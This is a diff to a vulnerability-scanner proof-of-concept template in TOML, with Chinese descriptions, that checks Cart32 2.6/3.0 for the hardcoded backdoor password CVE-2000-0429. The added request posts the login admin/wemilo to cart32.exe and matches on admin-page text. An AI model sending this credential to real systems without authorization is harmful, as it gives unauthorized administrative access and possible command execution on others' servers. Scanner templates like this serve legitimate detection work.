@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "检测 Cart32 2.6/3.0 购物车系统是否存在硬编码后门密码漏洞（CVE-2000-0429）。通过向 cart32.exe 发送包含后门密码 'wemilo' 的请求验证后门是否存在。"
+author = "ave"
+description = "验证 Cart32 2.6/3.0 后门密码 'wemilo' 是否存在，可导致远程管理后台访问及任意命令执行"
 id = "POC-AVE-2000-0352"
-name = "Cart32 Backdoor Password PoC"
+name = "CVE-2000-0429 PoC"
 severity = "high"
 tags = ["ave-2000-0352"]
 vuln_id = [
@@ -11,11 +11,11 @@ vuln_id = [
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cart32.exe"
+path = "/cart32.exe"
 protocol = "http"
 
 [[poc.requests.matchers]]
@@ -23,3 +23,31 @@ expect = true
 part = "body"
 type = "word"
 words = ["Cart32"]
+
+[[poc.requests]]
+method = "POST"
+path = "/cart32.exe"
+protocol = "http"
+
+[poc.requests.body]
+content = "UserName=admin&Password=wemilo&Submit=Login"
+type = "form"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Administration",
+    "admin",
+    "Cart32 Admin",
+    "Welcome",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
